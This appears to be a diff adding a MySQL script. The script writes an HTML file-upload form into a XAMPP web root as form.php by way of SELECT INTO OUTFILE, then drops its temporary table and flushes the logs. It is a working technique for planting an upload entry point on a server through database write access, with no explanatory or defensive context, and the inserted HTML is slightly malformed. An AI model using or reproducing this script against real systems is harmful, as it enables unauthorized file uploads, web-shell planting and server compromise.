@@ -1,0 +1,7 @@
+use test;
+DROP TABLE IF EXISTS `temptab`;
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab (codetab) values ('<form enctype="multipart/form-data" action="upload.php" method="post"><pre lang="html">Upload file :<form enctype="multipart/form-data" action="upload.php" method="post"><input name="userfile" type="file" /><input type="submit" value="Upload" /></form>');
+SELECT * INTO OUTFILE 'C:\\xampp\\htdocs\\form.php' from temptab;
+DROP TABLE temptab;
+FLUSH LOGS;
